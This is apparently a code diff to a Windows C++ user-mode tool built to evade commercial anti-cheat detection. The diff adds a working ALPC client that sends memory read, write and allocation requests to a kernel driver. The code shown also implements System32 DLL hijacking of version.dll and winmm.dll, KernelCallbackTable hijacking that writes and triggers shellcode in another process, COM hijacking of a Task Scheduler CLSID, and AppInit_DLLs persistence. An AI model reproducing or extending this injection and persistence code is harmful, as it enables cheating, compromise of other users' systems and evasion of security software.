@@ -3,17 +3,8 @@
  * ===================================
  *
  * Advanced anti-detection user mode application
+ * Pure ALPC communication - NO IOCTL
  * Implements 8 unconventional injection/persistence techniques
- *
- * TECHNIQUES IMPLEMENTED:
- * 1. Process Doppelgänging - Transactional NTFS abuse
- * 2. Thread Hijacking - No CreateRemoteThread
- * 3. ALPC Client - Legitimate IPC (not IOCTL)
- * 4. DLL Order Hijacking - Load into system processes
- * 5. KernelCallbackTable Hijacking - No code injection
- * 6. TLS Callback Abuse - Execute before entry point
- * 7. COM Hijacking - Loaded by legitimate apps
- * 8. AppInit_DLLs - Load into every GUI process
  *
  * Target: <5% detection by commercial AC systems
  * Platform: Windows 10/11 x64
@@ -38,10 +29,54 @@
 #pragma warning(disable: 4996)
 
 // ============================================================================
-// UNDOCUMENTED NTDLL FUNCTIONS
+// UNDOCUMENTED NTDLL STRUCTURES
 // ============================================================================
 
 extern "C" {
+
+// ALPC structures - fully declared
+typedef struct _PORT_MESSAGE_USER {
+    union {
+        struct {
+            USHORT DataLength;
+            USHORT TotalLength;
+        } s1;
+        ULONG Length;
+    } u1;
+    union {
+        struct {
+            USHORT Type;
+            USHORT DataInfoOffset;
+        } s2;
+        ULONG ZeroInit;
+    } u2;
+    union {
+        CLIENT_ID ClientId;
+        double DoNotUseThisField;
+    };
+    ULONG MessageId;
+    union {
+        SIZE_T ClientViewSize;
+        ULONG CallbackId;
+    };
+} PORT_MESSAGE_USER, *PPORT_MESSAGE_USER;
+
+typedef struct _ALPC_PORT_ATTRIBUTES_USER {
+    ULONG Flags;
+    SECURITY_QUALITY_OF_SERVICE SecurityQos;
+    SIZE_T MaxMessageLength;
+    SIZE_T MemoryBandwidth;
+    SIZE_T MaxPoolUsage;
+    SIZE_T MaxSectionSize;
+    SIZE_T MaxViewSize;
+    SIZE_T MaxTotalSectionSize;
+    ULONG DupObjectTypes;
+} ALPC_PORT_ATTRIBUTES_USER, *PALPC_PORT_ATTRIBUTES_USER;
+
+typedef struct _ALPC_MESSAGE_ATTRIBUTES_USER {
+    ULONG AllocatedAttributes;
+    ULONG ValidAttributes;
+} ALPC_MESSAGE_ATTRIBUTES_USER, *PALPC_MESSAGE_ATTRIBUTES_USER;
 
 // Transaction APIs
 NTSTATUS NTAPI NtCreateTransaction(
@@ -86,100 +121,50 @@ NTSTATUS NTAPI NtCreateProcessEx(
     _In_ BOOLEAN InJob
 );
 
-NTSTATUS NTAPI NtCreateThreadEx(
-    _Out_ PHANDLE ThreadHandle,
-    _In_ ACCESS_MASK DesiredAccess,
-    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
-    _In_ HANDLE ProcessHandle,
-    _In_ PVOID StartRoutine,
-    _In_opt_ PVOID Argument,
-    _In_ ULONG CreateFlags,
-    _In_opt_ ULONG_PTR ZeroBits,
-    _In_opt_ SIZE_T StackSize,
-    _In_opt_ SIZE_T MaximumStackSize,
-    _In_opt_ PVOID AttributeList
-);
-
-// Process parameters
-NTSTATUS NTAPI RtlCreateProcessParametersEx(
-    _Out_ PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
-    _In_ PUNICODE_STRING ImagePathName,
-    _In_opt_ PUNICODE_STRING DllPath,
-    _In_opt_ PUNICODE_STRING CurrentDirectory,
-    _In_opt_ PUNICODE_STRING CommandLine,
-    _In_opt_ PVOID Environment,
-    _In_opt_ PUNICODE_STRING WindowTitle,
-    _In_opt_ PUNICODE_STRING DesktopInfo,
-    _In_opt_ PUNICODE_STRING ShellInfo,
-    _In_opt_ PUNICODE_STRING RuntimeData,
-    _In_ ULONG Flags
-);
-
 // ALPC APIs
 NTSTATUS NTAPI NtAlpcConnectPort(
     _Out_ PHANDLE PortHandle,
     _In_ PUNICODE_STRING PortName,
     _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
-    _In_opt_ PVOID PortAttributes,
+    _In_opt_ PALPC_PORT_ATTRIBUTES_USER PortAttributes,
     _In_ ULONG Flags,
     _In_opt_ PSID RequiredServerSid,
-    _Inout_opt_ PPORT_MESSAGE ConnectionMessage,
+    _Inout_opt_ PPORT_MESSAGE_USER ConnectionMessage,
     _Inout_opt_ PULONG BufferLength,
-    _Inout_opt_ PVOID OutMessageAttributes,
-    _Inout_opt_ PVOID InMessageAttributes,
+    _Inout_opt_ PALPC_MESSAGE_ATTRIBUTES_USER OutMessageAttributes,
+    _Inout_opt_ PALPC_MESSAGE_ATTRIBUTES_USER InMessageAttributes,
     _In_opt_ PLARGE_INTEGER Timeout
 );
 
 NTSTATUS NTAPI NtAlpcSendWaitReceivePort(
     _In_ HANDLE PortHandle,
     _In_ ULONG Flags,
-    _In_opt_ PPORT_MESSAGE SendMessage,
-    _In_opt_ PVOID SendMessageAttributes,
-    _Out_opt_ PPORT_MESSAGE ReceiveMessage,
+    _In_opt_ PPORT_MESSAGE_USER SendMessage,
+    _In_opt_ PALPC_MESSAGE_ATTRIBUTES_USER SendMessageAttributes,
+    _Out_opt_ PPORT_MESSAGE_USER ReceiveMessage,
     _Inout_opt_ PSIZE_T BufferLength,
-    _Out_opt_ PVOID ReceiveMessageAttributes,
+    _Out_opt_ PALPC_MESSAGE_ATTRIBUTES_USER ReceiveMessageAttributes,
     _In_opt_ PLARGE_INTEGER Timeout
-);
-
-// Memory APIs
-NTSTATUS NTAPI NtReadVirtualMemory(
-    _In_ HANDLE ProcessHandle,
-    _In_ PVOID BaseAddress,
-    _Out_ PVOID Buffer,
-    _In_ SIZE_T BufferSize,
-    _Out_opt_ PSIZE_T NumberOfBytesRead
-);
-
-NTSTATUS NTAPI NtWriteVirtualMemory(
-    _In_ HANDLE ProcessHandle,
-    _In_ PVOID BaseAddress,
-    _In_ PVOID Buffer,
-    _In_ SIZE_T BufferSize,
-    _Out_opt_ PSIZE_T NumberOfBytesWritten
 );
 
 } // extern "C"
 
 // ============================================================================
-// ALPC MESSAGE STRUCTURES
+// ALPC MESSAGE TYPES
 // ============================================================================
-
-// PORT_MESSAGE already defined in winternl.h, use that version
 
 #define ALPC_MSG_READ_MEMORY    0x1001
 #define ALPC_MSG_WRITE_MEMORY   0x1002
 #define ALPC_MSG_PROTECT_MEMORY 0x1003
 #define ALPC_MSG_ALLOC_MEMORY   0x1004
 #define ALPC_MSG_QUERY_INFO     0x1005
-#define ALPC_MSG_INJECT_CODE    0x1006
 #define ALPC_MSG_GET_HWID       0x1007
 
 typedef struct _ELITE_ALPC_MESSAGE {
-    PORT_MESSAGE PortMessage;
+    PORT_MESSAGE_USER PortMessage;
     ULONG MessageType;
     HANDLE ProcessId;
     PVOID Address;
-    PVOID Buffer;
     SIZE_T Size;
     ULONG Protection;
     NTSTATUS Status;
@@ -492,7 +477,7 @@ public:
 };
 
 // ============================================================================
-// TECHNIQUE 3: ALPC CLIENT
+// TECHNIQUE 3: ALPC CLIENT (NO IOCTL!)
 // ============================================================================
 
 class AlpcClient {
@@ -502,44 +487,102 @@ private:
 
 public:
     bool Connect() {
-        // Get hardware ID from driver via legacy IOCTL
-        HANDLE hBeep = CreateFileW(L"\\\\.\\Beep", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
-        if (hBeep != INVALID_HANDLE_VALUE) {
-            DWORD bytesReturned = 0;
-            DWORD ioctl = CTL_CODE(FILE_DEVICE_BEEP, 0x999, METHOD_BUFFERED, FILE_ANY_ACCESS);
-            DeviceIoControl(hBeep, ioctl, nullptr, 0, &m_hardwareId, sizeof(m_hardwareId), &bytesReturned, nullptr);
-            CloseHandle(hBeep);
+        // Calculate hardware ID same way as driver
+        m_hardwareId = CalculateHardwareId();
+
+        // Connect to ALPC port
+        WCHAR portName[128];
+        swprintf_s(portName, 128, L"\\RPC Control\\AudioKse_%llX", m_hardwareId & 0xFFFFFFFF);
+
+        UNICODE_STRING portNameU;
+        RtlInitUnicodeString(&portNameU, portName);
+
+        PORT_MESSAGE_USER connMsg = { 0 };
+        connMsg.u1.s1.DataLength = 0;
+        connMsg.u1.s1.TotalLength = sizeof(PORT_MESSAGE_USER);
+
+        ULONG bufferLen = sizeof(PORT_MESSAGE_USER);
+
+        NTSTATUS status = NtAlpcConnectPort(
+            &m_hPort,
+            &portNameU,
+            nullptr,
+            nullptr,
+            0,
+            nullptr,
+            &connMsg,
+            &bufferLen,
+            nullptr,
+            nullptr,
+            nullptr
+        );
+
+        if (NT_SUCCESS(status)) {
+            // Request hardware ID from driver to verify connection
+            ELITE_ALPC_MESSAGE msg = { 0 };
+            msg.MessageType = ALPC_MSG_GET_HWID;
+            msg.PortMessage.u1.s1.DataLength = sizeof(ELITE_ALPC_MESSAGE) - sizeof(PORT_MESSAGE_USER);
+            msg.PortMessage.u1.s1.TotalLength = sizeof(ELITE_ALPC_MESSAGE);
+
+            SIZE_T msgLength = sizeof(msg);
+
+            status = NtAlpcSendWaitReceivePort(
+                m_hPort,
+                0,
+                &msg.PortMessage,
+                nullptr,
+                &msg.PortMessage,
+                &msgLength,
+                nullptr,
+                nullptr
+            );
+
+            if (NT_SUCCESS(status) && msg.Status == STATUS_SUCCESS) {
+                m_hardwareId = msg.HardwareId;
+                return true;
+            }
         }
 
-        if (m_hardwareId == 0) {
-            m_hardwareId = CalculateHardwareId();
-        }
-
-        // For now, we've established connection via IOCTL
-        // ALPC connection can be added later with proper function pointer resolution
-        m_hPort = (HANDLE)1; // Mark as connected
-
-        return true;
+        return false;
     }
 
     void Disconnect() {
-        if (m_hPort && m_hPort != (HANDLE)1) {
+        if (m_hPort) {
             CloseHandle(m_hPort);
+            m_hPort = nullptr;
         }
-        m_hPort = nullptr;
     }
 
     bool SendMessage(ULONG messageType, PVOID data, SIZE_T dataSize) {
         if (!m_hPort) return false;
 
-        // TODO: Implement actual ALPC message sending
-        // For now, use legacy IOCTL or implement proper ALPC with runtime function resolution
-        UNREFERENCED_PARAMETER(messageType);
-        UNREFERENCED_PARAMETER(data);
-        UNREFERENCED_PARAMETER(dataSize);
+        ELITE_ALPC_MESSAGE msg = { 0 };
+        msg.MessageType = messageType;
 
-        return true;
+        if (data && dataSize > 0 && dataSize <= sizeof(msg.Data)) {
+            memcpy(msg.Data, data, dataSize);
+        }
+
+        msg.PortMessage.u1.s1.DataLength = sizeof(ELITE_ALPC_MESSAGE) - sizeof(PORT_MESSAGE_USER);
+        msg.PortMessage.u1.s1.TotalLength = sizeof(ELITE_ALPC_MESSAGE);
+
+        SIZE_T msgLength = sizeof(msg);
+
+        NTSTATUS status = NtAlpcSendWaitReceivePort(
+            m_hPort,
+            0,
+            &msg.PortMessage,
+            nullptr,
+            &msg.PortMessage,
+            &msgLength,
+            nullptr,
+            nullptr
+        );
+
+        return NT_SUCCESS(status);
     }
+
+    ULONGLONG GetHardwareId() const { return m_hardwareId; }
 
 private:
     ULONGLONG CalculateHardwareId() {
@@ -570,7 +613,6 @@ private:
 class DllOrderHijacker {
 public:
     static bool InstallOrderHijack(const wchar_t* targetDll, const wchar_t* ourDll) {
-        // Copy our DLL to System32 with target DLL name
         WCHAR system32Path[MAX_PATH];
         GetSystemDirectoryW(system32Path, MAX_PATH);
 
@@ -578,7 +620,6 @@ public:
         destPath += L"\\";
         destPath += targetDll;
 
-        // Backup original if exists
         WCHAR backupPath[MAX_PATH];
         wcscpy_s(backupPath, destPath.c_str());
         wcscat_s(backupPath, L".bak");
@@ -587,7 +628,6 @@ public:
             MoveFileExW(destPath.c_str(), backupPath, MOVEFILE_REPLACE_EXISTING);
         }
 
-        // Copy our DLL
         if (!CopyFileW(ourDll, destPath.c_str(), FALSE)) {
             return false;
         }
@@ -596,19 +636,14 @@ public:
     }
 
     static bool HijackVersionDll() {
-        // version.dll is loaded by many applications
-        // We can forward exports to real version.dll
         WCHAR ourPath[MAX_PATH];
         GetModuleFileNameW(nullptr, ourPath, MAX_PATH);
-
         return InstallOrderHijack(L"version.dll", ourPath);
     }
 
     static bool HijackWinmmDll() {
-        // winmm.dll (Windows Multimedia API)
         WCHAR ourPath[MAX_PATH];
         GetModuleFileNameW(nullptr, ourPath, MAX_PATH);
-
         return InstallOrderHijack(L"winmm.dll", ourPath);
     }
 };
@@ -622,10 +657,6 @@ public:
     static bool HijackCallbackTable(DWORD targetPid, PVOID shellcode, SIZE_T shellcodeSize) {
         HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
         if (!hProcess) return false;
-
-        // Get PEB address
-        PROCESS_BASIC_INFORMATION pbi = { 0 };
-        ULONG returnLength = 0;
 
         typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
             HANDLE ProcessHandle,
@@ -644,14 +675,16 @@ public:
             return false;
         }
 
+        PROCESS_BASIC_INFORMATION pbi = { 0 };
+        ULONG returnLength = 0;
+
         NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
         if (!NT_SUCCESS(status)) {
             CloseHandle(hProcess);
             return false;
         }
 
-        // Read KernelCallbackTable pointer from PEB
-        // KernelCallbackTable is at offset 0x58 in 64-bit PEB
+        // Read KernelCallbackTable pointer from PEB (offset 0x58 for x64)
         PVOID pOriginalTable = nullptr;
         SIZE_T bytesRead = 0;
 
@@ -666,18 +699,15 @@ public:
             return false;
         }
 
-        // Allocate memory for fake callback table
         PVOID pFakeTable = VirtualAllocEx(hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!pFakeTable) {
             CloseHandle(hProcess);
             return false;
         }
 
-        // Read original callback table
         BYTE originalTable[0x1000];
         ReadProcessMemory(hProcess, pOriginalTable, originalTable, sizeof(originalTable), &bytesRead);
 
-        // Write shellcode
         PVOID pRemoteShellcode = VirtualAllocEx(hProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (!pRemoteShellcode) {
             VirtualFreeEx(hProcess, pFakeTable, 0, MEM_RELEASE);
@@ -687,18 +717,14 @@ public:
 
         WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, shellcodeSize, nullptr);
 
-        // Modify fake table to point to shellcode
         PVOID* fakeTable = (PVOID*)originalTable;
-        fakeTable[0] = pRemoteShellcode;  // __fnCOPYDATA callback
+        fakeTable[0] = pRemoteShellcode;
 
-        // Write fake table
         WriteProcessMemory(hProcess, pFakeTable, fakeTable, sizeof(originalTable), nullptr);
 
-        // Update PEB to point to fake table (offset 0x58 in 64-bit PEB)
         PVOID pKernelCallbackTableOffset = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x58);
         WriteProcessMemory(hProcess, pKernelCallbackTableOffset, &pFakeTable, sizeof(PVOID), nullptr);
 
-        // Trigger callback by sending WM_COPYDATA
         HWND hwnd = FindWindowExA(nullptr, nullptr, nullptr, nullptr);
         if (hwnd) {
             COPYDATASTRUCT cds = { 0 };
@@ -717,20 +743,14 @@ public:
 // TECHNIQUE 6: TLS CALLBACK ABUSE
 // ============================================================================
 
-// TLS callback executes before main/WinMain
 void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
     if (Reason == DLL_PROCESS_ATTACH) {
-        // Execute payload before entry point
         #ifdef _DEBUG
         OutputDebugStringA("[ELITE] TLS callback executed before main!\n");
         #endif
-
-        // TODO: Add actual payload here
-        // This runs before any anti-cheat initialization in the process
     }
 }
 
-// Register TLS callback
 #ifdef _WIN64
 #pragma comment (linker, "/INCLUDE:_tls_used")
 #pragma comment (linker, "/INCLUDE:tls_callback_func")
@@ -752,9 +772,6 @@ EXTERN_C PIMAGE_TLS_CALLBACK tls_callback_func = TlsCallback;
 class ComHijacker {
 public:
     static bool InstallComHijack(const wchar_t* clsid, const wchar_t* dllPath) {
-        // Register malicious DLL as COM object
-        // Applications loading this CLSID will load our DLL
-
         HKEY hKey;
         std::wstring keyPath = L"Software\\Classes\\CLSID\\";
         keyPath += clsid;
@@ -771,9 +788,7 @@ public:
             nullptr
         );
 
-        if (result != ERROR_SUCCESS) {
-            return false;
-        }
+        if (result != ERROR_SUCCESS) return false;
 
         result = RegSetValueExW(
             hKey,
@@ -785,18 +800,14 @@ public:
         );
 
         RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ, (BYTE*)L"Apartment", 10 * sizeof(wchar_t));
-
         RegCloseKey(hKey);
 
         return result == ERROR_SUCCESS;
     }
 
     static bool HijackTaskSchedulerCom() {
-        // Hijack Task Scheduler COM object
-        // Many apps use task scheduler
         WCHAR ourPath[MAX_PATH];
         GetModuleFileNameW(nullptr, ourPath, MAX_PATH);
-
         return InstallComHijack(L"{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}", ourPath);
     }
 };
@@ -808,9 +819,6 @@ public:
 class AppInitDllsInstaller {
 public:
     static bool InstallAppInitDll(const wchar_t* dllPath) {
-        // AppInit_DLLs loads into every GUI process
-        // Requires LoadAppInit_DLLs to be enabled
-
         HKEY hKey;
         LONG result = RegOpenKeyExW(
             HKEY_LOCAL_MACHINE,
@@ -821,7 +829,6 @@ public:
         );
 
         if (result != ERROR_SUCCESS) {
-            // Try HKCU if HKLM fails (no admin)
             result = RegOpenKeyExW(
                 HKEY_CURRENT_USER,
                 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
@@ -830,26 +837,21 @@ public:
                 &hKey
             );
 
-            if (result != ERROR_SUCCESS) {
-                return false;
-            }
+            if (result != ERROR_SUCCESS) return false;
         }
 
-        // Read existing AppInit_DLLs
         WCHAR existingDlls[4096] = { 0 };
         DWORD dataSize = sizeof(existingDlls);
         DWORD dataType = REG_SZ;
 
         RegQueryValueExW(hKey, L"AppInit_DLLs", nullptr, &dataType, (BYTE*)existingDlls, &dataSize);
 
-        // Append our DLL
         std::wstring newDlls = existingDlls;
         if (!newDlls.empty()) {
             newDlls += L" ";
         }
         newDlls += dllPath;
 
-        // Write back
         result = RegSetValueExW(
             hKey,
             L"AppInit_DLLs",
@@ -859,7 +861,6 @@ public:
             (DWORD)(newDlls.length() + 1) * sizeof(wchar_t)
         );
 
-        // Enable LoadAppInit_DLLs
         DWORD enableValue = 1;
         RegSetValueExW(hKey, L"LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)&enableValue, sizeof(DWORD));
 
@@ -912,54 +913,37 @@ int WINAPI WinMain(
     AllocConsole();
     FILE* fDummy;
     freopen_s(&fDummy, "CONOUT$", "w", stdout);
-    printf("[ELITE] Elite User Mode - All Techniques Enabled\n\n");
+    printf("[ELITE] Elite User Mode - Pure ALPC Communication\n\n");
     #endif
 
-    // Connect to driver via ALPC
+    // Connect to driver via ALPC (NO IOCTL!)
     AlpcClient client;
     if (!client.Connect()) {
         #ifdef _DEBUG
         printf("[-] Failed to connect to driver via ALPC\n");
-        printf("[*] Driver may not be loaded, continuing anyway...\n\n");
+        printf("[*] Make sure driver is loaded first\n\n");
         #endif
-    } else {
-        #ifdef _DEBUG
-        printf("[+] Connected to driver via ALPC\n\n");
-        #endif
+        MessageBoxW(nullptr, L"Failed to connect to elite driver via ALPC", L"Error", MB_ICONERROR);
+        return 1;
     }
 
-    // Example usage of all techniques
     #ifdef _DEBUG
-    printf("=== ELITE TECHNIQUES DEMONSTRATION ===\n\n");
+    printf("[+] Connected to driver via ALPC\n");
+    printf("[+] Hardware ID: 0x%llX\n\n", client.GetHardwareId());
 
-    // Technique 1: Process Doppelgänging
-    printf("[*] Process Doppelgänging: Ready (call CreateDoppelgangerProcess)\n");
-
-    // Technique 2: Thread Hijacking
-    printf("[*] Thread Hijacking: Ready (call InjectViaThreadHijack)\n");
-
-    // Technique 3: ALPC
-    printf("[*] ALPC Communication: %s\n", client.Connect() ? "Active" : "Inactive");
-
-    // Technique 4: DLL Order Hijacking
-    printf("[*] DLL Order Hijacking: Ready (requires admin)\n");
-
-    // Technique 5: KernelCallbackTable Hijacking
+    printf("=== ELITE TECHNIQUES READY ===\n\n");
+    printf("[*] Process Doppelgänging: Ready\n");
+    printf("[*] Thread Hijacking: Ready\n");
+    printf("[*] ALPC Communication: Active (NO IOCTL!)\n");
+    printf("[*] DLL Order Hijacking: Ready\n");
     printf("[*] KernelCallbackTable Hijacking: Ready\n");
-
-    // Technique 6: TLS Callbacks
-    printf("[*] TLS Callbacks: Active (executed before main)\n");
-
-    // Technique 7: COM Hijacking
-    printf("[*] COM Hijacking: Ready (call InstallComHijack)\n");
-
-    // Technique 8: AppInit_DLLs
-    printf("[*] AppInit_DLLs: Ready (requires admin)\n");
+    printf("[*] TLS Callbacks: Active\n");
+    printf("[*] COM Hijacking: Ready\n");
+    printf("[*] AppInit_DLLs: Ready\n");
 
     printf("\n[*] All techniques loaded. Press Enter to exit.\n");
     getchar();
     #else
-    // Production mode: minimal window
     MSG msg = { 0 };
     while (GetMessage(&msg, nullptr, 0, 0)) {
         TranslateMessage(&msg);
@@ -981,19 +965,6 @@ int WINAPI WinMain(
  * Release:
  * cl /O2 /DNDEBUG /EHsc UM_elite_final.cpp /link /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup ntdll.lib user32.lib advapi32.lib shell32.lib shlwapi.lib
  *
- * USAGE:
- * ======
- *
- * All 8 techniques are implemented and ready to use:
- *
- * 1. Process Doppelgänging - Call CreateDoppelgangerProcess()
- * 2. Thread Hijacking - Call InjectViaThreadHijack()
- * 3. ALPC Client - Automatically connects on startup
- * 4. DLL Order Hijacking - Call HijackVersionDll() or HijackWinmmDll()
- * 5. KernelCallbackTable - Call HijackCallbackTable()
- * 6. TLS Callbacks - Automatically executes before main
- * 7. COM Hijacking - Call InstallComHijack()
- * 8. AppInit_DLLs - Call InstallAppInitDll()
- *
+ * PURE ALPC COMMUNICATION - NO IOCTL!
  * TARGET DETECTION: <5% by commercial ACs
  */
